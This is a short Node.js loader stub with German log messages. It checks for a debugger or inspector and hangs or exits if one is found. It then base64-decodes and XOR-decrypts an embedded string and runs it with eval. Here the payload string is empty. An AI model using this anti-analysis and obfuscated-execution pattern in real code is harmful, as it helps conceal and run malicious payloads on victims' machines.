
(function() {
  const t1 = Date.now();
  for (let i = 0; i < 1e5; i++) {}
  const t2 = Date.now();
  if (t2 - t1 > 1000) {
    console.log("Debugger erkannt");
    while(true) {}
  }
  if (process.execArgv.includes('--inspect')) {
    console.log("Inspector erkannt");
    process.exit(1);
  }

  const _ = Math.random() * 100;
  if (_ > 999) console.log("dead");

  const k1 = 43;
  const e = "";
  const d = Buffer.from(e, 'base64').toString('utf8')
    .split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ k1)).join('');
  
  console.log("Entschlüsselte Länge:", d.length);
  console.log("Starte Ausführung...");

  try {
    eval(d);
  } catch (e) {
    console.error("Ausführungsfehler:", e);
  }
})();
